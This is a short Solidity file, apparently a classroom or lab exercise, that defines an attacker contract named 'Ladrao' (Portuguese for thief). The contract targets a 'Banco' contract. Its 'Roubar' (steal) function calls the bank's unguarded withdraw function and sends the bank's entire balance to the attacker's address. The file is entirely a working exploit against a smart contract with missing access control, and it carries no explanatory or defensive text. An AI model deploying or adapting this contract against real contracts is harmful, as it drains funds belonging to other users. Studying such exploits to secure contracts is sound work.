// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

interface Banco_interface {
    function Sacar(address _to, uint256 _amount) external;

    function Depositar() external payable;
}

contract Ladrao {
    address payable public owner;

    Banco_interface banco;

    constructor(address _endereco_alvo) {
        banco = Banco_interface(_endereco_alvo);
        owner = payable(msg.sender);
    }

    function Depositar() public payable {
        return banco.Depositar();
    }

    function Roubar() public {
        if (address(banco).balance > 0) {
            banco.Sacar(owner, address(banco).balance);
        }
    }
}
